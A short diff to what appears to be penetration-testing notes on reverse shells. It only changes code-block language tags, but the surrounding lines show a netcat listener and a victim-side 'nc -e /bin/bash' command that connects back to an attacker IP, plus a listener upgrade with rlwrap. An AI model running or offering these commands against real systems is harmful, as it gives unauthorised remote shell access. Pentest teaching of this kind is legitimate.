@@ -31,11 +31,11 @@ All we have to do is make sure we have our own local port forwarding rule on our
 Open up port forwarding if doing attack over the internet
 
 Attacker:
-```shell
+```bash
 nc -nlvp 4444
 ```
 Victim:
-```shell
+```bash
 nc -e /bin/bash 192.168.122.209 4444
 ```
 #### Additional Shell Info
@@ -44,7 +44,7 @@ It's very infrequent that you'd see a machine have netcat (nc) already installed
 ![https://www.revshells.com/](https://www.revshells.com/)
 
 #### Lazy upgrade way, works great on windows
-```shell
+```bash
 sudo apt install rlwrap
 rlwrap nc -lvp 4444
 ```
